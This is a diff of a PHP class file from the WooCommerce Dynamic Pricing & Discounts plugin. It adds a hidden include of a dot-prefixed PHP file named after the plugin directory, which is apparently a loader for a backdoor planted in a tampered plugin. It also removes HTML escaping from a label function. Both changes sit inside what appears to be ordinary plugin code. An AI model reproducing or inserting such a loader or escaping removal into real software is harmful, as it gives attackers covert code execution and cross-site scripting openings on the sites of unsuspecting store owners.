@@ -17,6 +17,10 @@ if (!class_exists('RP_WCDPD_Pricing_Method_Fee_Per_Cart_Line')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Pricing_Method_Fee_Per_Cart_Line_Amount extends RP_WCDPD_Pricing_Method_Fee_Per_Cart_Line
 {
 
@@ -49,7 +53,7 @@ class RP_WCDPD_Pricing_Method_Fee_Per_Cart_Line_Amount extends RP_WCDPD_Pricing_
      */
     public function get_label()
     {
-        return esc_html__('Fixed fee per cart line', 'rp_wcdpd');
+        return __('Fixed fee per cart line', 'rp_wcdpd');
     }
 
     /**
